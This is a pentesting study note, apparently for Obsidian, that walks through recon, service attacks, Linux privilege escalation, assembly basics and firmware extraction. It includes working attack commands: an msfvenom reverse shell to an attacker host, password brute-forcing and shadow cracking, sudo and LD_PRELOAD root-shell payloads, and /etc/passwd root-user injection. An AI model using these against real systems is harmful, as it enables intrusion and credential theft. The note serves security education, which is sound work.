---
title: Cybersecurity Workflow Overview
category: general-reference
tags: [ks-import, recon, privilege-escalation, reverse-engineering, services, mapping]
source: cheater/cheatshit.md
sourceId: 10008
---
# 🧠 Cybersecurity Field Guide

> **Purpose:** Turn a dense technical cheat sheet into a visual, memorable Obsidian note.
> 
> ⚠️ **Use only on systems, networks, binaries, and labs you are explicitly authorized to test.**

---

# 🗺️ The Big Picture

Think of the whole workflow as a game map:

```
🛰️ RECON
   ↓
🚪 SERVICES
   ↓
🔓 ACCESS
   ↓
⬆️ PRIV ESC
   ↓
🔬 REVERSE ENGINEERING
   ↓
📦 FIRMWARE
```

### 🧩 Memory Hook

> **“See → Enter → Rise → Understand → Extract”**

|Stage|Question to remember|
|---|---|
|🛰️ Recon|**What exists?**|
|🚪 Services|**What is exposed?**|
|🔓 Access|**Can the service be abused?**|
|⬆️ Priv Esc|**How do I go higher?**|
|🔬 RE|**What is the binary doing?**|
|📦 Firmware|**What is hidden inside?**|

---

# 🛰️ SECTION 1 — RECONNAISSANCE & FOOTPRINTING

## 1A. Passive Recon — 🥷 “See without touching”

> **Goal:** Map the attack surface without sending a packet to the target.

### 🧠 Remember: **W-D-C-S**

**W**HOIS → **D**NS → **C**RTs → **S**hodan/Censys

---

### 🌐 1. WHOIS / RDAP

**Ports:** TCP `43` / HTTPS `443`

```
whois target.com | grep -iE "Registrar:|Name Server:|Creation Date|Expiration Date"
```

```
curl -s https://rdap.verisign.com/com/v1/domain/target.com | jq .
```

### 🎯 Look for

- 📅 **Expiration dates** → renewal phishing / hijacking
    
- 🌍 **Authoritative nameservers** → hints about infrastructure / WAF presence
    

---

### 🧭 2. DNS Interrogation

**Port:** UDP/TCP `53`

```
dig @1.1.1.1 target.com [A|AAAA|CNAME|MX|TXT]
```

Clean output:

```
dig +short target.com [TYPE]
```

### 🔍 DNS clues

|Record|Memory image|What to notice|
|---|---|---|
|`A`|🏠 IPv4 house|Main IPv4 destination|
|`AAAA`|🏢 IPv6 building|Compare with `A`|
|`CNAME`|🪧 Sign pointing elsewhere|Possible dangling alias|
|`TXT`|📝 Sticky note|SPF / DMARC policy|

> 🧠 **AAAА = “Another Address?”**  
> Compare IPv6 with IPv4.

> 🧠 **CNAME = “Can Name Mean Elsewhere?”**

> 🧠 **TXT = “Text tells trust.”**

Source examples:

- `AAAA` → compare against `A` for IPv4-only filtering assumptions
    
- `CNAME` → look for dangling aliases to deleted S3/GitHub resources
    
- `TXT` → inspect SPF and DMARC; the source notes that `p=none` allows email spoofing
    

---

### 📜 3. Certificate Transparency — crt.sh

Public certificate logs can reveal subdomains that are not openly advertised.

```
https://crt.sh/?q=%.target.com
```

CLI extraction:

```
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### 🧠 Memory

> **Certificates remember names.**

---

### 🌍 4. Internet-Wide Scanners

**Shodan / Censys**

Example syntax:

```
hostname:"target.com"
org:"Target Corp"
product:"Apache"
port:80
```

### 🎯 Look for

- 🗄️ Unindexed databases
    
    - MySQL `3306`
        
    - Redis `6379`
        
- 🛠️ Exposed administration panels
    
- 🌐 Recursive DNS resolvers
    

---

## 1B. Active Recon — 🎯 “Now interact”

> **Goal:** Establish live ground truth by interacting directly with network sockets.

### 🧠 Memory Hook: **P-B-N**

**P**ath → **B**anners → **N**map

---

### 📡 1. Host Discovery & Path Diagnostics

#### Ping

```
ping -c 4 [TARGET_IP]
```

### TTL clue from the source

```
≈ 64   → Linux
≈ 128  → Windows
```

#### Route mapping

```
traceroute [TARGET_IP]
```

- Linux default → UDP
    
- Windows `tracert` → ICMP
    

#### TCP-based route probing

```
traceroute -T -p 80 [TARGET_IP]
```

> 🧠 **Traceroute = “How do I get there?”**

---

### 📢 2. Banner Grabbing

#### Netcat

```
nc [TARGET_IP] [PORT]
```

Source note:

- FTP `21`
    
- SMTP `25`
    

#### Manual HTTP/1.1 probe

```
nc [TARGET_IP] 80
```

Then send:

```
GET / HTTP/1.1
Host: target
```

Then:

```
Double Enter
```

#### Headers only

```
curl -I http://[TARGET_IP]
```

> 🧠 **Banner = “Who are you?”**

---

### 🧭 3. Nmap Precision Scanning

#### Full port scan

```
nmap -p- -T4 [TARGET_IP]
```

#### Service/version detection

```
nmap -sV -sC -Pn -p [PORTS] [TARGET_IP]
```

#### SYN scan

```
nmap -sS -p [PORTS] [TARGET_IP]
```

---

# 🚪 SECTION 2 — NETWORK SERVICE EXPLOITATION

> **Memory trick: Ports are doors. Services are what’s behind them.**

## 🔢 Default-Port Map

|🚪 Service|🔢 Port|🧠 Primary vectors from source|
|---|---|---|
|FTP|`21`|Anonymous login, Hydra brute-force|
|SSH|`22`|Stolen private keys, password reuse|
|Telnet|`23 / 8012+`|Cleartext sniffing, unauthenticated backdoors, Blind RCE|
|SMTP|`25`|`VRFY` user enumeration, phishing relay|
|SMB|`139 / 445`|Null sessions, unauthenticated shares|
|NFS|`2049 / 111`|`showmount`, mounting shares, `no_root_squash` SUID|
|MySQL|`3306`|Default creds, hashdump, Outfile RCE|

---

## 🪟 2A. SMB & NFS Share Attacks

### SMB Null Session Enumeration

```
enum4linux -a [TARGET_IP]
```

Anonymous connection:

```
smbclient //[TARGET_IP]/[SHARE_NAME] -U Anonymous
```

Source examples:

```
get id_rsa
get backup.zip
```

### 🧠 SMB memory hook

> **SMB = “Shares May Betray.”**

---

### 📦 NFS

List exports:

```
showmount -e [TARGET_IP]
```

Mount locally:

```
sudo mount -t nfs [TARGET_IP]:[EXPORT_PATH] /mnt/target/ -nolock
```

The source highlights:

```
no_root_squash
```

as a privilege-escalation condition.

> 🧠 **NFS = “Network File Shelf.”**

---

## ☎️ 2B. Blind RCE & Reverse Shell Protocol

### The Wiretap idea

Start packet capture:

```
sudo tcpdump ip proto \icmp -i tun0
```

Trigger a ping from the target:

```
.RUN ping [KALI_IP] -c 1
```

### Confirmation logic

```
Ping arrives?
   ↓
YES
   ↓
RCE confirmed
```

> 🧠 **No output? Listen for a side effect.**

---

### Reverse shell workflow

Generate payload:

```
msfvenom -p cmd/unix/reverse_netcat lhost=[KALI_IP] lport=4444 R
```

Start listener:

```
nc -lvnp 4444
```

**Flags:**

- `-l` → listen
    
- `-v` → verbose
    
- `-n` → numeric / no DNS
    
- `-p` → port
    

Concept:

```
Target  ───────►  Kali listener
          outbound
```

> 🧠 **Reverse shell = “Target calls you.”**

---

## 🔑 2C. Password Auditing

### Hydra

```
hydra -t 16 -l [USERNAME] -P /usr/share/wordlists/rockyou.txt -vV [TARGET_IP] [ssh|ftp|mysql]
```

### John the Ripper

Merge:

```
unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

Dictionary attack:

```
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Hashcat — Linux SHA-512 `$6$`

```
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -O
```

### 🧠 Memory

> **Hydra = online.**  
> **John / Hashcat = offline.**

---

# ⚡ SECTION 3 — LINUX PRIVILEGE ESCALATION

## 🧠 The “8 Vectors” Ladder

Memorize:

```
1️⃣ SUDO
   ↓
2️⃣ SUID / CAPS
   ↓
3️⃣ CRON
   ↓
4️⃣ FILES / CREDS
   ↓
5️⃣ PATH
   ↓
6️⃣ .SO HIJACK
   ↓
7️⃣ HISTORY / CONFIG
   ↓
8️⃣ KERNEL
```

The source also gives this strict triage sequence:

```
[Step 1: Sudo]
       ↓
[Step 2: SUID/Caps]
       ↓
[Step 3: Cron]
       ↓
[Step 4: Files]
       ↓
[Step 5: Local Ports]
```

> 🧠 **Rule:** Start simple. Escalate complexity only when needed.

---

## 3.1 👑 Sudo Rights

Check:

```
sudo -l
```

Cross-reference allowed binaries with:

```
gtfobins.github.io
```

Source examples include:

### `find`

```
sudo find . -exec /bin/bash \; -quit
```

### `less`

```
sudo less /etc/profile
```

Then:

```
!/bin/sh
```

### `awk`

```
sudo awk 'BEGIN {system("/bin/bash")}'
```

### `vim`

```
sudo vim -c '!sh'
```

### `nano`

Source sequence:

```
sudo nano
→ Ctrl+R
→ Ctrl+X
→ reset; sh 1>&0 2>&0
```

> 🧠 **Sudo question:** “What powerful program may I already run as root?”

---

### LD_PRELOAD Injection

Condition:

```
env_keep += LD_PRELOAD
```

Source C code:

```
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile:

```
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
```

Execute:

```
sudo LD_PRELOAD=/tmp/shell.so [ANY_ALLOWED_BINARY]
```

---

# 3.2 🧷 SUID / SGID

### Discovery

```
find / -perm -u=s -type f 2>/dev/null
```

or:

```
find / -perm -4000
```

> 🧠 **4000 = SUID clue**

---

### 📖 Arbitrary File Read

Source examples:

```
base64 /etc/shadow | base64 --decode
```

```
base64 /root/root.txt | base64 --decode
```

### ✍️ Arbitrary File Write

Source workflow:

```
openssl passwd -1 -salt evil Password123
```

Then:

```
evil:[GENERATED_HASH]:0:0:root:/root:/bin/bash
```

The source describes appending/overwriting `/etc/passwd`, then:

```
su evil
```

> 🧠 **SUID question:** “What can run with someone else’s power?”

---

# 3.3 🧬 Linux Capabilities

Discover:

```
getcap -r / 2>/dev/null
```

### 🎯 Look for

```
cap_setuid+ep
```

The source calls out examples such as Python, Perl, and Vim.

Example from source:

```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> 🧠 **Capability = “A tiny piece of root power.”**

---

# 3.4 ⏰ Cron Jobs

Inspect:

```
cat /etc/crontab
```

```
ls -la /etc/cron.* /var/spool/cron/crontabs/
```

### Two source vectors

**A — Writable script**

```
Root runs script
      ↓
Script is writable
      ↓
Modify script
```

**B — Wildcard tar injection**

```
touch /path/to/target/--checkpoint=1
```

```
touch '/path/to/target/--checkpoint-action=exec=sh shell.sh'
```

> 🧠 **Cron = “Who runs what, and when?”**

---

# 3.5 🛣️ Relative `$PATH` Hijacking

### Discovery idea

Find an SUID binary or root script that invokes a command without an absolute path.

Source example:

```
system("service")
system("thm")
```

Check:

```
echo $PATH
```

Prepend writable directory:

```
export PATH=/tmp:$PATH
```

Create script:

```
echo '/bin/bash -p' > /tmp/thm
chmod +x /tmp/thm
```

Run the SUID binary.

Concept:

```
Root program
    ↓
calls "thm"
    ↓
PATH searched first
    ↓
/tmp/thm
```

> 🧠 **PATH = “Who gets picked first?”**

---

# 3.6 🧪 SUID Shared Object Hijacking

Trace:

```
strace [SUID_BINARY] 2>&1 | grep -iE "open|access|no such file"
```

### Look for

```
Missing .so
   +
Writable user directory
   +
RPATH / RUNPATH behavior
```

Source payload pattern:

```
static void inject() __attribute__((constructor));

void inject() {
    system("/bin/bash -p");
}
```

Compile:

```
gcc -shared -fPIC -o /path/to/missing_lib.so payload.c
```

Run the SUID binary.

> 🧠 **Library hijack = “The program asks for a missing part; you provide it.”**

---

# 3.7 🕵️ Credential & History Hunting

### Bash history

```
cat ~/.bash_history
```

```
grep -iE "passw|user|admin|mysql|key" ~/.bash_history
```

### Configuration files

Source examples:

```
cat /etc/openvpn/auth.txt
```

```
cat ~/.irssi/config
```

```
cat /var/www/html/wp-config.php
```

### Recursive search

```
grep -rnwi "password" /home/ /etc/ /var/www/ 2>/dev/null
```

> 🧠 **Human habit:** people leave clues in history and config.

---

# 3.8 ☠️ Kernel Exploits — Last Resort

### Discovery

```
uname -a
```

```
cat /etc/issue
```

### Stage from Kali

```
python3 -m http.server 8000
```

Fetch on target:

```
wget http://[KALI_IP]:8000/exploit.c -O /tmp/exploit.c
```

Compile:

```
gcc -O2 -pthread /tmp/exploit.c -o /tmp/exploit
```

Execute:

```
chmod +x /tmp/exploit && /tmp/exploit
```

### Famous examples in source

```
CVE-2015-1328 → OverlayFS Local Root
CVE-2016-5195 → Dirty COW
```

> 🧠 **Kernel = “Use the big hammer last.”**

---

# 🔬 SECTION 4 — REVERSE ENGINEERING & ASSEMBLY

# 4.1 🧠 x64 CPU Architecture

## The “VIP Registers”

### 📍 RIP — the GPS

> **RIP = Instruction Pointer**

Holds the memory address of the next instruction.

Source idea:

```
Overwrite RIP
    ↓
Redirect execution
```

### 🧮 RAX — the answer box

Stores function return values.

Source example:

```
1 = True
0 = False
```

---

## 🪆 Register Slicing — Matryoshka Dolls

Think:

```
RAX  64-bit  ┌─────────────────────────────┐
             │                             │
EAX  32-bit  ├────────────────────         │
             │                    │         │
AX   16-bit  ├────────────        │         │
             │            │       │         │
AL    8-bit  ├────        │       │         │
             └────┬───────┴───────┴─────────┘
```

Memory order:

```
RAX → EAX → AX → AL
64     32     16    8
```

> 🧠 **Big doll contains smaller dolls.**

---

# 4.2 📞 Fastcall Calling Convention

Parameter registers:

```
1st → RCX
2nd → RDX
3rd → R8
4th → R9
5th+ → Stack
```

### 🧠 Memory rhyme

> **“C D 8 9, then Stack.”**

---

# 4.3 🧱 Core Assembly Verbs

|Instruction|Think of it as|
|---|---|
|`MOV`|📦 Copy|
|`LEA`|🧭 Calculate address|
|`XOR`|🧹 Clear|
|`CMP`|⚖️ Compare|
|`JCC`|🚦 Conditional branch|
|`NOP`|🧍 Do nothing|

### `MOV`

```
MOV destination, source
```

Copies data.

Square brackets:

```
[ ]
```

mean memory dereference.

---

### `LEA`

```
LEA destination, [Address]
```

Calculates an effective address without dereferencing it.

---

### `XOR`

```
XOR register, register
```

Source note:

> Clears a register to zero without generating `\x00` null bytes.

---

### `CMP`

```
CMP destination, source
```

Conceptually subtracts to set CPU flags.

Important source flags:

```
ZF = Zero Flag
SF = Sign Flag
OF = Overflow Flag
```

---

### `JCC` 🚦

Common conditions:

```
JE / JZ   → Equal / Zero
JNE / JNZ → Not equal / Not zero
JG / JL   → Signed
JA / JB   → Unsigned
```

---

### `NOP`

```
\x90
```

> **No Operation**

Source use:

> NOP sleds can help catch unstable execution pointers during buffer overflows.

---

# 4.4 🧠 Memory Layout & Endianness

## Stack

> The stack grows **DOWN** toward lower addresses.

```
PUSH → RSP decreases
POP  → RSP increases
```

### 🧠 Memory trick

> **Push goes down. Pop comes up.**

---

## Little-Endian

Intel x86/x64 stores the least significant byte first.

Example address:

```
0x77AABBCC
```

Payload byte order:

```
\xCC\xBB\xAA\x77
```

> 🧠 **Little = smallest piece first.**

---

# 4.5 🧰 Reverse Engineering Toolkit

### Disassemble

```
objdump -M intel -d [BINARY] > source.asm
```

### Show lines before a call

```
grep -B 15 "call.*<target_func>" source.asm
```

### Show lines after a call

```
grep -A 20 "target_func" source.asm
```

### Trace shared-library calls

```
ltrace ./[BINARY] [ARGUMENTS]
```

Source examples:

```
strcmp
strncmp
printf
```

### Extract strings

```
strings -n 6 [BINARY]
```

> 🧠 **RE workflow:**  
> **Disassemble → Locate → Trace → Read strings**

---

# 📦 SECTION 5 — FIRMWARE & EMBEDDED REVERSE ENGINEERING

## 5.1 🔎 Extraction with binwalk

Scan magic signatures:

```
binwalk [FIRMWARE.img]
```

Extract hidden filesystems / kernels:

```
binwalk -e [FIRMWARE.img]
```

> 🧠 **binwalk = “Find the hidden layers.”**

---

# 5.2 🧱 Mounting JFFS2 Filesystems

Create block device:

```
sudo mknod /dev/mtdblock0 b 31 0
```

Load modules:

```
sudo modprobe jffs2 mtdram mtdblock
```

Write flash data:

```
sudo dd if=filesystem.jffs2 of=/dev/mtdblock0
```

Mount:

```
sudo mount -t jffs2 /dev/mtdblock0 /mnt/jffs2_file/
```

---

# 5.3 🎯 High-Value Firmware Targets

|Path|What to remember|
|---|---|
|`/etc/shadow` / `/etc/passwd`|🔑 Hardcoded credentials|
|`/www` or `/htdocs`|🌐 Administrative web-panel source|
|`/etc/system_defaults`|🏭 Factory-reset credentials / hidden AP keys|

> 🧠 **Firmware memory hook: “Secrets → Web → Defaults.”**

---

# 🧠 ONE-PAGE MEMORY WALL

## 🛰️ Recon

```
WHOIS → DNS → CRT → SHODAN/CENSYS
```

## 📡 Active

```
PING → TRACE → BANNER → NMAP
```

## 🚪 Services

```
21 FTP
22 SSH
23 Telnet
25 SMTP
139/445 SMB
2049/111 NFS
3306 MySQL
```

## ⬆️ Priv Esc

```
SUDO
 ↓
SUID / CAPS
 ↓
CRON
 ↓
FILES / CREDS
 ↓
PATH
 ↓
.SO
 ↓
HISTORY
 ↓
KERNEL
```

## 🔬 Assembly

```
RIP = GPS
RAX = Return
RAX > EAX > AX > AL
RCX → RDX → R8 → R9 → Stack
MOV = Copy
LEA = Address
XOR = Zero
CMP = Compare
JCC = Branch
NOP = Nothing
```

## 📦 Firmware

```
BINWALK
  ↓
EXTRACT
  ↓
MOUNT
  ↓
CHECK /etc
  ↓
CHECK WEB FILES
  ↓
CHECK DEFAULTS
```

---

# 🧪 ACTIVE RECALL — CLOSE THE NOTE

Answer these from memory before revealing the answers.

### 🛰️ Recon

**Q:** What are the four passive recon buckets?

<details> <summary>Answer</summary>

WHOIS/RDAP → DNS → Certificate Transparency → Shodan/Censys

</details>

**Q:** What record should make you think “dangling alias”?

<details> <summary>Answer</summary>

CNAME

</details>

---

### 🚪 Services

**Q:** FTP?

<details><summary>Answer</summary>`21`</details>

**Q:** SSH?

<details><summary>Answer</summary>`22`</details>

**Q:** SMB?

<details><summary>Answer</summary>`139 / 445`</details>

**Q:** MySQL?

<details><summary>Answer</summary>`3306`</details>

---

### ⬆️ Priv Esc

**Q:** What do you check first?

<details><summary>Answer</summary>

`sudo -l`

</details>

**Q:** What bit is the classic SUID bit?

<details><summary>Answer</summary>

Octal `4000`

</details>

**Q:** What command discovers capabilities?

<details><summary>Answer</summary>

`getcap -r / 2>/dev/null`

</details>

**Q:** What is the “last resort”?

<details><summary>Answer</summary>

Kernel exploits

</details>

---

### 🔬 Assembly

**Q:** Which register is the instruction pointer?

<details><summary>Answer</summary>

RIP

</details>

**Q:** Which register stores function return values?

<details><summary>Answer</summary>

RAX

</details>

**Q:** Calling convention order?

<details><summary>Answer</summary>

RCX → RDX → R8 → R9 → Stack

</details>

**Q:** Little-endian means?

<details><summary>Answer</summary>

Least significant byte first

</details>

---

# 🧠 10-SECOND REVIEW

> **Recon finds the map.**  
> **Scanning finds the doors.**  
> **Services reveal the entry points.**  
> **Privilege escalation finds the ladder.**  
> **Reverse engineering explains the machine.**  
> **Firmware hides the extra layers.**

### 🔖 Tags

`#cybersecurity` `#pentesting` `#recon` `#networking` `#linux` `#privesc` `#assembly` `#reverse-engineering` `#firmware` `#obsidian`
